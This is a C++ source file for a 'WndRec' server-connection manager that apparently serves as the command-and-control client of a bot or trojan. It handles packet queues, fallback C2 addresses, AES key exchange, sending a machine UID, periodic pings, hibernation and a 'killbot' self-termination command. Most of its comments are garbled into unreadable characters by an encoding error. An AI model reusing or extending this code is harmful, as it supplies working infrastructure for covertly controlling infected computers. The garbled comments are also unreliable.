#include "WndRec\manager.h"
#include "WndRec\sender.h"
#include "WndRec\tunnel.h"
#include "WndRec\stream.h"
#include "core\debug.h"
#include "core\abstract.h"

namespace WndRec 
{

const DWORD MaxTimeNoAction = 10 * 60 * 1000; //����� �����������, �� ��������� �������� ����������� �� �������
const DWORD TimeLivePackage = 5 * 60 * 1000; //����� ����� ������ ����� ������
const int MaxPackageCount = 40000; //������������ ���������� ������� � ��������� ������ ������
const int MaxFreePackage = 300; //������������ ���������� ��������� �������
//����� � ������� �������� ���������� �����, ���� ����� �������� � ������� 30� ���������� �����,
//�� ������ ��� �������, ��� ��� ������� ���������� �������
const int MinTimeConnectBreak = 30000; 
//���������� �������, ����� ������� ����������� �� ������ ��������� ����
//�. �. ���� ����� ������ ���������, ������ �������� � ��������� �� ���� ������ ��� ���-��
//� ������, ������� ����� ����������� �� ������ (�������������) ������
const int MaxAttemptsConnect = 5;

static void InitList( ListPackage& list );
static void ReleaseList( ListPackage& list );
static DWORD WINAPI ManagerThread( LPVOID p );
static Package* ExtractPackage( ListPackage& list, Package* prev );
//���������� ������ �� ������ �� ��� id ��� cmd
static Package* ExtractPackage( ListPackage& list, uint id, int cmd );
static void AddLastPackage( ListPackage& list, Package* p );
static void AddFirstPackage( ListPackage& list, Package* p );
static void ReleasePackage( Package* p );
static bool SendPackage(ServerData* server);
//������� ������ ������� ����� ����� � ������
static void ReleasePackageTime( ListPackage& list, ListPackage& packageFree );
static void CloseServer(ServerData* server);
//��������� ����� � ������ ��������
static bool AddInPackage( ServerData* server, int cmd, int id, void* data, int sz );
//bool inited = false; //true - ���� ���������� �������������������

ServerData servers[MaxServers];
int c_servers = 0;
CRITICAL_SECTION lockServers;
CRITICAL_SECTION lockConnect; //������������ ��� �������� ���������� �� ���������� ������, ����� ������� �� ����� ���������
uint maxID = 0; //id ��� �������

//������������� ��������� �������
ServerData* Init( int flags, const char* ip, int port, int downtime )
{
	CriticalSection::Init(lockServers);
	CriticalSection::Init(lockConnect);
	c_servers = 0;
	//������ ���� �� ��� � ������ ������ � ����� �� IP
	int numServer = -1;
	int numFree = -1; //����� ���������� �������� ��� ������ �������
	CriticalSection::Enter(lockServers);
	//��������� ��������������� �� ������ � ���������� ip:port
	if( (flags & 2) == 0 )
		for( int i = 0; i < c_servers && numServer < 0; i++ )
			for( int j = 0; j < servers[i].c_ip; j++ )
				if( Str::Cmp( servers[i].ip[j].ip, ip ) == 0 && servers[i].ip[j].port == port )
				{
					numServer = i;
					break;
				}
	if( numServer < 0 ) //����� ������
	{
		//���� ��������� ������ ��� �������
		for( int i = 0; i < c_servers; i++ )
			if( servers[i].c_ip == 0 )
			{
				numFree = i;
				break;
			}
		if( numFree < 0 && c_servers < MaxServers ) 
		{
			numFree = c_servers; //��������� ���, ��������� �����
			c_servers++;
		}
		if( numFree >= 0 )
		{
			servers[numFree].c_ip = 0;
			servers[numFree].currIP = 0;
			AddIPServer( &servers[numFree], ip, port );
		}
	}
	CriticalSection::Leave(lockServers);
	if( numServer >= 0 ) 
	{
		if( (flags & 1) == 0 && servers[numServer].stopManager == 3 ) //�������� � ������ ������ � ���� ������� �� �����������
			OutOfHibernation(&servers[numServer]);
		servers[numServer].downtime = downtime ? downtime * 60 * 1000 : MaxTimeNoAction;
		servers[numServer].flags = flags;
		return &servers[numServer];
	}
	numServer = numFree;
	ServerData* server = &servers[numServer];
	
	StringBuilderStack<64> uid;
	Abstract::GetUid(uid);
	server->buf = InitPacketBuf( (byte*)uid.c_str(), uid.Len() );

	server->stopManager = 0;
	if( flags & 1 ) //������ � ������ ������
		server->stopManager = 3;
//	server->scServer = 0;
	server->io.Init();

	InitList(server->packageIn);
	InitList(server->packageOut);
	InitList(server->packageFree);

	server->downtime = downtime ? downtime * 60 * 1000 : MaxTimeNoAction;
	server->flags = flags;
	server->timeConnect = 0;
	server->attemptsConnect = 0;
	server->sleep = 0;

	InitTunnels();
	InitStreams();
	RunThread( ManagerThread, server );

	DbgMsg( "init server %08x", (DWORD)server );

	return server;
}

DWORD AddIPServer( ServerData* server, const char* ip, int port )
{
	if( server == 0 || server->c_ip >= MaxIPOnServer || ip == 0 || ip[0] == 0 ) return FALSE;
	DbgMsg( "server %08x add ip %s:%d (c_ip=%d)", server, ip, port, server->c_ip );
	CriticalSection lock(lockServers);
	int i = 0;
	for( ; i < server->c_ip; i++ )
		if( Str::Cmp( server->ip[i].ip, ip ) == 0 && server->ip[i].port == port )
			break;
	if( i >= server->c_ip )
	{
		Str::Copy( server->ip[server->c_ip].ip, ip );
		server->ip[server->c_ip].port = port;
		server->c_ip++;
	}
	else
		DbgMsg( "server %s:%d is present", ip, port );
	return TRUE;
}

void Release( ServerData* server )
{
	if( server == 0 ) return;

	if( server->stopManager != 2 ) //���� ������� ����� ��������, �� ������������� ���
	{
		server->stopManager = 1;
		int wait = 60 * 1000 / 100;
		while( server->stopManager == 1 && --wait ) Delay(100); 
		//���� � ������� ������ ����� �� �������� ������, ������ ��������� ��������
		if( wait == 0 ) CloseServer(server);
	}
	
	ReleasePacketBuf(server->buf);
	server->buf = 0;
	ReleaseList(server->packageIn);
	ReleaseList(server->packageOut);
	ReleaseList(server->packageFree);
	server->c_ip = 0;

	//������� ������� ��� ����� ��������
	int lived = 0;
	CriticalSection lock(lockServers);
	for( int i = 0; i < c_servers; i++ )
		if( servers[i].c_ip > 0 )
			lived++;
	if( lived == 0 ) //����� �������� ���, ����������� ��� �������
	{
		c_servers = 0;
	}
}

bool Reconnect( ServerData* server, const char* ip, int port )
{
	if( !server ) return false;
	for( int i = 0; i < server->c_ip; i++ )
	{
		if( Str::Cmp( server->ip[i].ip, ip ) == 0 && server->ip[i].port == port )
		{
			CriticalSection::Enter(lockConnect);
			if( server->currIP != i ) CloseServer(server);
			server->currIP = i;
			server->timeConnect = 0;
			server->attemptsConnect = 0;
			CriticalSection::Leave(lockConnect);
			OutOfHibernation(server);
			return true;
		}
	}
	return false;
}

void UpdateSettings( ServerData* server, int setFlags, int resetFlags, int downtime )
{
	if( server == 0 ) return;
	server->flags |= setFlags; //��������������� �����
	server->flags &= ~resetFlags; //���������� �����
	if( downtime >= 0 )
		server->downtime = downtime ? downtime * 60 * 1000 : MaxTimeNoAction;
}

//���������� ������� � ������� �� ������, ���������� ������������� ���������� ������, ���� ��������� 0,
//�� ������ ��������.
//���� ����� ����� ������ ����� 4096 ����, �� �� ������� �� ��������� �������, ������ �� ����� 4096 ����,
//��� ���� ��� ������ ����� ����� ���� � ���� �������
DWORD WriteData( ServerData* server, int cmd, const void* data, int c_data, int flags, uint id )
{
//	if( !inited || server == 0  ) return 0;
	Package* p = AllocPackage( server, c_data );
	if( p == 0 ) return 0;
	p->data.Copy( data, c_data );
	p->id = id;
	DWORD ret = WritePackage( server, cmd, p, flags );
	if( ret == 0 ) //���� �������� �� ������, �� ����� ����� � ������ ���������
	{
		AddLastPackage( server->packageFree, p );
	}
	return ret;
}

void WaitSendedPackages( ServerData* server, int min, int wait )
{
	while( wait > 0 )
	{
		if( server->packageOut.count <= min ) break;
		Delay(100);
		wait -= 100;
	}
}

//������ ������ �� �������������� �������������� �������� WriteData. ���������� ����� ���������� ������.
//data - ��������� �� ����� ���� ����� ������� ������, szData - ������ ������, ���� szData < 0, ��
//������� ���� �������� ������ ���������� ������ � ���������� � data, � ����� ������� ����� ����� �����������
//������.
//wait - ���������� ���������� �������� ������
//���� ������������ 0, �� ������ ������, ���� -1, �� ������ ��� ���, ����� ��� �����
int ReadData( ServerData* server, DWORD id, int cmd, void** data, int szData, int wait )
{
	if( server == 0 ) return 0;
	int time = 0;
	while( time < wait )
	{
		Package* p = ExtractPackage( server->packageIn, id, cmd );
		if( p )
		{
			if( szData < 0 )
			{
				szData = p->data.Len();
				*data = Mem::Alloc(szData);
			}
			else
				if( szData > p->data.Len() )
					szData = p->data.Len();
			Mem::Copy( *data, p->data.Ptr(), szData );
			AddLastPackage( server->packageFree, p );
			return szData;
		}
//		if( server->scServer <= 0 ) return 0;
		if( !server->io.Connected() ) return 0;
		time += 10;
		Delay(10);
	}
	return -1;
}

int ReadData2( ServerData* server, DWORD id, int cmd, void* data, int szData, int wait )
{
	if( data && szData > 0 )
		return ReadData( server, id, cmd, &data, szData, wait );
	return 0;
}

//�������� ������� � ������� � �������� ���������. �������� ����� WriteData() � ReadData()
int GetData( ServerData* server, int cmd, void* sendData, int c_sendData, void** recvData, int szRecvData, int flags, int wait )
{
	uint id = WriteData( server, cmd, sendData, c_sendData, flags );
	if( id == 0 ) return 0;
	return ReadData( server, id, 0, recvData, szRecvData, wait );
}

int GetData2( ServerData* server, int cmd, void* sendData, int c_sendData, void* recvData, int szRecvData, int flags, int wait )
{
	if( recvData && szRecvData > 0 )
		return GetData( server, cmd, sendData, c_sendData, &recvData, szRecvData, flags, wait );
	return 0;
}

int OutOfHibernation( ServerData* server, bool notWait )
{
//	if( !inited ) return 1; //�� ���� �������������
//	if( server->scServer > 0 ) return 0; //����� ��������
	if( server->io.Connected() ) return 0; //����� ��������
	if( server->stopManager == 3 ) //����� � ������ ��������
	{
		server->stopManager = 0; //���������� �����
		if( !notWait )
		{
			int wait = 10;
//			while( --wait && server->scServer <= 0 ) Delay(1000); //���� ����� �����������
			while( --wait && !server->io.Connected() ) Delay(1000); //���� ����� �����������
//			if( server->scServer <= 0 ) //�� �����������
			if( !server->io.Connected() ) //�� �����������
				return 3;
		}
		return 0;
	}
	return 2; //����� ������ ����� �� ��������
}

DWORD WritePackage( ServerData* server, int cmd, Package* p, int flags )
{
	if( server->stopManager == 3 ) //� ������ ������
	{
		//����������
		if( OutOfHibernation( server, true ) != 0 ) 
			return 0;
	}
//	if( server->scServer <= 0 && (flags & 2) ) return 0; 
	if( !server->io.Connected() && (flags & 2) ) return 0; 
	//���� �������� � ������� ���, �� ���� ��� ���-�� ������, � ������ ����� ����� �����
//	int wait = 60 * 1000 / 100;
//	while( server->scServer <= 0 && --wait ) Delay(100);
//	if( server->scServer <= 0 ) return 0;
	DbgMsg( "all packets %d", server->packageOut.count );
	while( server->packageOut.count >= MaxPackageCount ) 
	{
//		if( server->scServer <= 0 && (flags & 2) ) return 0;
		if( !server->io.Connected() && (flags & 2) ) return 0;
		Delay(10);
	}
	p->cmd = cmd;
	p->time = API(KERNEL32, GetTickCount)();
	p->flags = flags;
	if( flags & 4 ) //������� ���������, ����� � ������ �������, ����� ������� �����������
		AddFirstPackage( server->packageOut, p );
	else
	{
		AddLastPackage( server->packageOut, p );
	}
	DbgMsg( "add package cmd %d, id %d, size %d", p->cmd, p->id, p->data.Len() );
	return p->id;
}

static bool ConnectToServer( ServerData* server )
{
	CriticalSection cs(lockConnect);
	for( int i = 0; i < server->c_ip; i++ )
	{
		DWORD time = API(KERNEL32, GetTickCount)();
		if( time - server->timeConnect < MinTimeConnectBreak ) //������� ����� �� �����������
			server->attemptsConnect++;
		else
			server->attemptsConnect = 0;
		if( server->attemptsConnect >= MaxAttemptsConnect ) //����� ��� ���������� �����
		{
			DbgMsg( "impossible normal connect to %s:%d, try another", server->ip[server->currIP].ip, server->ip[server->currIP].port );
			server->timeConnect = 0;
			server->attemptsConnect = 0;
		}
		else
		{
			DbgMsg( "try connect %s:%d", server->ip[server->currIP].ip, server->ip[server->currIP].port );
//			server->scServer = Socket::ConnectIP( server->ip[server->currIP].ip, server->ip[server->currIP].port );
			bool res;
			if( server->ip[server->currIP].port > 0 )
			{
//				if( server->ip[server->currIP].port == 443 )
//					res = server->io.ConnectHttps(server->ip[server->currIP].ip);
//				else
					res = server->io.ConnectIP( server->ip[server->currIP].ip, server->ip[server->currIP].port );
			}
			else
				res = server->io.ConnectPipe( server->ip[server->currIP].ip );
//			if( server->scServer <= 0 )
			if( !res )
				DbgMsg( "Not connect %s:%d", server->ip[server->currIP].ip, server->ip[server->currIP].port );
			else
			{
				DbgMsg( "Connected with %s:%d", server->ip[server->currIP].ip, server->ip[server->currIP].port );
				server->timeConnect = API(KERNEL32, GetTickCount)();
				//�������� ��� ������ ���������� (cmdexec ��� ������� � �������� ������)
				int connect = 1;
				AddInPackage( server, ID_CONNECTED, 0, &connect, sizeof(connect) );
				return true;
			}
		}
		server->currIP++;
		if( server->currIP >= server->c_ip ) server->currIP = 0;
	}
	return false;
}

//���������� �� �������
static void CloseServer(ServerData* server)
{
	DbgMsg( "break connection %08x", server );
//	Socket::Close(server->scServer);
	server->io.Close();
	bool connected = server->io.Connected();
	ResetBuf(server->buf);
//	if( server->scServer )
	if( connected )
	{
		int connect = 0;
		AddInPackage( server, ID_CONNECTED, 0, &connect, sizeof(connect) );
	}
//	server->scServer = 0;
	Delay(5000); //���� ������ ����, ����� ������� (������� �����) �������� ������ � ������� �����
	//������� ��������� ������ ������� ������ ���������� ��� ������� �����
	CriticalSection::Enter(server->packageOut.lock);
	if( server->packageOut.last )
	{
		Package* prev = server->packageOut.last; 
		for(;;)
		{
			if( prev->next->flags & 1 )
			{
				Package* p = ExtractPackage( server->packageOut, prev );
				DbgMsg( "del package cmd %d, id %d", p->cmd, p->id );
				if( server->packageFree.count > MaxFreePackage ) //� ������ ��������� ������������ ���������� ���������
					ReleasePackage(p);
				else
					AddLastPackage( server->packageFree, p );
				if( server->packageOut.last == 0 ) break;
			}
			else
			{
				prev = prev->next;
				if( prev == server->packageOut.last ) break;
			}
		}
	}
	CriticalSection::Leave(server->packageOut.lock);
	if( server->flags & 4 ) //��� ������� ����� ������ ������ ��������� ������
		server->stopManager = 1;
	server->buf->rsa = true;
	DbgMsg("break connection end");
}

//�������� ���� ����� �� ������, ���������� true, ���� ���� ��� ������ �� ��������, false - ���� ������ ������ ��������
static bool SendPackage(ServerData* server)
{
	bool ret = false;
	Package* p = 0;
	CriticalSection::Enter(server->packageOut.lock);
	if( server->packageOut.count > 0 )
	{
//		if( server->scServer > 0 )
		if( server->io.Connected() )
		{
			p = ExtractPackage( server->packageOut, server->packageOut.last ); //��������� 1-� ����� � ������
			if( server->packageOut.count > 0 ) ret = true;
		}
		else
			ret = true; //���������� ���, �� ���� ��� ������
	}
	CriticalSection::Leave(server->packageOut.lock);
	if( p )
	{
		if( WritePacket( server->buf, p->cmd, server->io, p->data.Ptr(), p->data.Len(), p->id ) ) //���� �������� ��������, �� ����� ����� � ������ ���������
		{
			if( server->packageFree.count < MaxFreePackage )
				AddLastPackage( server->packageFree, p );
			else
				ReleasePackage(p);
		}
		else //���� �������� ���������, �� ������ ����� ���������� �����
		{
			DbgMsg( "not send package cmd %d, id %d", p->cmd, p->id );
			AddFirstPackage( server->packageOut, p ); //����� ����� ������� � ������ ������
			CloseServer(server);
			ret = true;
		}
	}
	return ret;
}

//�������� ����� � ����� ��� � ������ ��������, ���������� true, ���� ��� ������ �����
static bool RecvPackage( ServerData* server, int wait )
{
//	if( server->scServer <= 0 ) return false;
	if( !server->io.Connected() ) return false;
	uint id;
	int cmd;
	char* data = (char*)-1;
	int sz = ReadPacket( server->buf, cmd, server->io, (void**)&data, wait, &id );
	if( sz > 0 )
	{
		return AddInPackage( server, cmd, id, data, sz );
	}
	else
		if( sz == 0 )
			CloseServer(server);
	return false;
}

static bool AddInPackage( ServerData* server, int cmd, int id, void* data, int sz )
{
	Package* p = AllocPackage( server, sz );
	if( p )
	{
		p->cmd = cmd;
		p->id = id;
		p->data.Copy( data, sz );
		p->time = API(KERNEL32, GetTickCount)();
		DbgMsg( "recv package cmd %d, id %d, len %d", p->cmd, p->id, p->data.Len() );
		AddLastPackage( server->packageIn, p );
		return true;
	}
	return false;
}

//������� ����������� �����, ������������ � ����������� ������ � �������, 
//������ ���� ������ ���� � ����� ��������
static DWORD WINAPI ManagerThread( LPVOID p )
{
	ServerData* server = (ServerData*)p;
	StringBuilderStack<64> uid;
	Abstract::GetUid(uid);
	int attemptsCount = 0; //���������� ������� �����������
	for(;;)
	{
		DWORD timePing = API(KERNEL32, GetTickCount)(); //����� ��� �������� ������
		DWORD timeNoAction = timePing; //����� �����������
		DWORD timeLive = 0; //����� ����� �������� �������
		int wait = 0; //����� �������� �������� ������
		while( server->stopManager == 0 )
		{
//			if( server->scServer <= 0 ) //��� ����������, �������� �����������
			if( !server->io.Connected() ) //��� ����������, �������� �����������
			{
				if( !ConnectToServer(server) ) //�� ������� �����������
				{
					attemptsCount++;
					if( attemptsCount > 20 && (server->flags & 8) ) //20 ������� ��������, �������� 2 ������
					{
						//�������� ������� killbot
						byte data[9];
						data[0] = 7;
						data[1] = 0;
						data[2] = 'k'; data[3] = 'i'; data[4] = 'l'; data[5] = 'l'; data[6] = 'b'; data[7] = 'o'; data[8] = 't';
						AddInPackage( server, 27, 0, data, sizeof(data) );
						server->stopManager = 1;
						break;
					}
					Delay(5000); //���� 5 ������
					continue;
				}
				attemptsCount = 0;
				//���� ������� ����� � ��� ���� 
				GenAES256Key(server->buf->aesKey);
				server->buf->rsa = true;
				if( !WritePacket( server->buf, ID_XOR_MASK, server->io, server->buf->aesKey.Ptr(), server->buf->aesKey.Len() ) ) 
				{
					CloseServer(server); //��� ������� ����� ����� �������� �����������
					continue; 
				}
				server->buf->rsa = false;
				if( !WritePacket( server->buf, ID_SET_UID2, server->io, uid, uid.Len() ) ) 
				{
					CloseServer(server); //��� ������� ����� ����� �������� �����������
					continue; 
				}
			}
			DWORD currTime = API(KERNEL32, GetTickCount)();

			if( server->packageOut.count > 0 )
			{
				timePing = currTime;
				timeNoAction = currTime;
			}
			if( server->packageIn.count > 0 )
				timeNoAction = currTime;

			if( server->packageOut.count > 0 )
				wait = 1;
			else
			{
				wait += 100;
				if( wait > 1000 ) wait = 1000;
			}
			RecvPackage( server, wait );
			//�� ����� �������� ��� ��������� �����, ������� ��������� ����� ��������
			if( server->packageOut.count > 0 ) wait = 1;
			SendPackage(server);

			if( currTime - timePing > 5000 ) //5 ������ �����������, ���� ����
			{
				timePing = currTime;
//				if( server->scServer > 0 )
				if( server->io.Connected() )
				{
					if( !WritePacket( server->buf, ID_PING, server->io, 0, 0 ) ) //�������� ����
					{
						CloseServer(server);
						continue;
					}
				}
			}
			if( currTime - timeLive > 60 * 1000 ) //������ ������ ������� ������, ������� ������� ����� � ������
			{
				timeLive = currTime;
				ReleasePackageTime( server->packageIn, server->packageFree );
			}
			//���� ����� ����� ��� ������, �� ������� � ������� ����� �� ����������� � ������� � ����� ������
			if( currTime - timeNoAction > server->downtime ) 
			{
				timeNoAction = currTime;
				int res = -1;
				if( WritePacket( server->buf, ID_BOT_WORK, server->io, 0, 0 ) )
				{
					int cmd = 0;
					char* data = (char*)-1;
					int sz = ReadPacket( server->buf, cmd, server->io, (void**)&data );
					if( sz > 0 ) res = data[0];
				}
				if( res < 0 ) //��������� �������
					CloseServer(server);
				else
					if( res == 0 ) //��� ����� �� �����
						server->stopManager = 3; //����� ������
			}
		}
		DbgMsg( "stopManager %d", server->stopManager );
		//���������� � ��������� ��� ������
//		while( server->scServer > 0 )
		while( server->io.Connected() )
			if( !SendPackage(server) && !RecvPackage( server, 1 ) )
				break;
		CloseServer(server);
		if( server->stopManager == 1 ) //������� �� ���������� ������ ������
		{
			server->stopManager = 2;
			break;
		}
		else
			//��������� � ������ ������, ���� �� �������� ������� �� ����������� ��� �� �������� ������
			if( server->stopManager == 3 ) 
			{
				DbgMsg( "stopManager 3, waiting %ds", server->sleep );
				int sleep = 0;
				while( server->stopManager == 3 ) 
				{
					Delay(1000);
					sleep++;
					if( server->sleep > 0 && server->sleep <= sleep )
					{
						server->stopManager = 0;
						DbgMsg( "����� �� ������" );
						break;
					}
				}
				if( server->stopManager != 0 ) //�� �����-�� ������� ����� �� ������ ��������
				{
					server->stopManager = 2;
					break;
				}
				DbgMsg( "run working!!!" );
			}
			else
				if( server->stopManager != 0 ) //�� ����� �������� � ������, ����� �������� �����, ������ ����� �����������
					break;
	}
	Delay(10 * 1000); //���� ���� ���������� ��� ��������
	Release(server); //���� ������ ��� ���������� �� ����� Release, �� ����� ���������� ������� (��������� ����� Release �� ������� �������)
	return 0;
}

static void InitList( ListPackage& list )
{
	list.last = 0;
	list.count = 0;
	CriticalSection::Init(list.lock);
}

static void ReleaseList( ListPackage& list )
{
	CriticalSection lock(list.lock);
	while( list.last )
	{
		Package* p = ExtractPackage( list, list.last );
		ReleasePackage(p);
	}
}

//���������� ������ � ����� ������
static void AddLastPackage( ListPackage& list, Package* p )
{
	CriticalSection lock(list.lock);
	if( list.last )
	{
		p->next = list.last->next;
		list.last->next = p;
	}
	else 
		p->next = p;
	list.last = p;
	if( p->id == 0 ) p->id = ++maxID;
	list.count++;
}

//���������� ������ � ������ ������ ������
static void AddFirstPackage( ListPackage& list, Package* p )
{
	CriticalSection lock(list.lock);
	if( list.last )
	{
		p->next = list.last->next;
		list.last->next = p;
	}
	else 
	{
		p->next = p;
		list.last = p;
	}
	if( p->id == 0 ) p->id = ++maxID;
	list.count++;
}

//������� �� ������ ����� ��������� �� prev, ���������� ��������� �� ����������� �����
static Package* ExtractPackage( ListPackage& list, Package* prev )
{
	Package* curr = prev->next;
	if( prev == curr ) //� ������ ���� �����
		list.last = 0;
	else
	{
		prev->next = curr->next;
		if( list.last == curr ) //����������� ��������� ������� � ������
			list.last = prev;
	}
	list.count--;
	return curr;
}

//���������� ������ �� ������ �� ��� id ��� cmd
static Package* ExtractPackage( ListPackage& list, uint id, int cmd )
{
	Package* finded = 0;
	CriticalSection lock(list.lock);
	if( list.last )
	{
		//������� ���� �����
		Package* prev = list.last; //��� �������� �� ������ ���� ���������� �����
		do
		{
			if( (id && prev->next->id == id) || (cmd && prev->next->cmd == cmd) )
			{
				finded = prev->next;
				break;
			}
			prev = prev->next;
		} while( prev != list.last );
		if( finded )
			ExtractPackage( list, prev );
	}
	return finded;
}

//�������� ����� ������� �������
Package* AllocPackage( ServerData* server, int sz )
{
	Package* finded = 0;
	CriticalSection::Enter( server->packageFree.lock );
	if( server->packageFree.last )
	{
		Package* prev = server->packageFree.last;
		do
		{
			if( prev->next->data.Size() >= sz )
			{
				finded = prev->next;
				break;
			}
		} while( prev != server->packageFree.last );
		if( finded )
			ExtractPackage( server->packageFree, prev );
		else //���� ������� ������� ������ ���, �� ����� 1-� � ����� ������������ � ��� ������ �� ������� �������
			finded = ExtractPackage( server->packageFree, server->packageFree.last );
	}
	CriticalSection::Leave( server->packageFree.lock );
	if( finded )
	{
		if( finded->data.Size() < sz ) //� ������ ������������ ������, ������������
		{
			if( !finded->data.MakeEnough(sz) )
			{
				ReleasePackage(finded);
				finded = 0;
			}
		}
	}
	else //������ ��� ������, ������� ����� �����
	{
		finded = new Package();
		if( finded )
		{
			sz = MinSizePackage > sz ? MinSizePackage : sz;
			if( !finded->data.MakeEnough(sz) )
			{
				ReleasePackage(finded);
				finded = 0;
			}
		}
	}
	if( finded ) //������������� ������
	{
		finded->data.SetLen(0);
		finded->id = 0;
	}
	return finded;
}

static void ReleasePackage( Package* p )
{
	delete p;
}

//������� ������ ������� ����� ����� � ������
static void ReleasePackageTime( ListPackage& list, ListPackage& packageFree )
{
	DWORD time = API(KERNEL32, GetTickCount)();
	CriticalSection lock(list.lock);
	if( list.last )
	{
		Package* prev = list.last; 
		for(;;)
		{
			if( time - prev->next->time > TimeLivePackage )
			{
				Package* p = ExtractPackage( list, prev );
				if( packageFree.count > MaxFreePackage ) //� ������ ��������� ������������ ���������� ���������
					ReleasePackage(p);
				else
					AddLastPackage( packageFree, p );
				DbgMsg( "del in package cmd %d, id %d, size %d", p->cmd, p->id, p->data.Len() );
				if( list.last == 0 ) break;
			}
			else
			{
				prev = prev->next;
				if( prev == list.last ) break;
			}
		}
	}
}

const char* GetIPServer(ServerData* server)
{
	return server->ip[server->currIP].ip;
}

int GetPortServer(ServerData* server)
{
	return server->ip[server->currIP].port;
}

int ReadCmd( ServerData* server, int& cmd, uint& id, const int cmds[][2], Mem::Data& data, int wait )
{
	int time = 0;
	while( time <= wait )
	{
		Package* finded = 0;
		CriticalSection::Enter(server->packageIn.lock);
		if( server->packageIn.last )
		{
			//� ������ ���� �����
			Package* prev = server->packageIn.last; //��� �������� �� ������ ���� ���������� �����
			do
			{
				int i = 0;
				while( cmds[i][0] )
					if( cmds[i][0] <= prev->next->cmd && prev->next->cmd <= cmds[i][1] )
					{
						finded = prev->next;
						ExtractPackage( server->packageIn, prev );
						break;
					}
					else
						i++;
				if( finded ) break;
				prev = prev->next;
			} while( prev != server->packageIn.last );
		}
		CriticalSection::Leave(server->packageIn.lock);
		if( finded )
		{
			cmd = finded->cmd;
			data.Copy(finded->data);
			AddLastPackage( server->packageFree, finded );
			id = finded->id;
			return data.Len();
		}
//		if( server->scServer <= 0 ) return 0;
		if( !server->io.Connected() ) return 0;
		time += 10;
		if( time > wait ) break;
		Delay(10);
	}
	return -1;
}

//����� � ����� ������
void RunHibernation( ServerData* server, int time )
{
	server->stopManager = 3;
	server->sleep = time;
}

//���� ���� ����� id �� ����������
bool WaitOutPackage( ServerData* server, DWORD id, int wait )
{
	int time = 0;
	bool ret = false;
	DbgMsg( "wait send package %d", id );
	while( time < wait && !ret )
	{
		ListPackage& list = server->packageOut;
		ret = true;
		CriticalSection::Enter(list.lock);
		if( list.last )
		{
			Package* prev = list.last; 
			do
			{
				if( prev->next->id == id ) //����� ��� � �������
				{
					ret = false;
					break;
				}
				prev = prev->next;
			} while( prev != list.last );
		}
		CriticalSection::Leave(list.lock);
		Delay(100);
	}
	DbgMsg( "package %d sended", id );
	return ret;
}

ServerData* DuplicationServer( ServerData* server, int id )
{
	ServerData* server2 = (ServerData*)Init( 2 + 4, server->ip[server->currIP].ip, server->ip[server->currIP].port, 24 * 60 * 60 * 1000 );
	return server2;
}

DWORD SendStr( ServerData* server, int id, int subId, const char* s, int c_s )
{
	if( server == 0 ) return 0;
	if( c_s < 0 ) c_s = Str::Len(s);
	int sz = sizeof(WndRec::StrServer) + c_s + 1;
	Package* p = AllocPackage( server, sz );
	if( p == 0 ) return 0;
	WndRec::StrServer* s2 = (WndRec::StrServer*)p->data.Ptr();
	s2->id = id;
	s2->subId = subId;
	s2->c_s = c_s;
	Mem::Copy( s2->s, s, c_s );
	s2->s[c_s] = 0;
	p->data.SetLen(sz);
	return WritePackage( server, ID_SENDSTR, p );
}


}
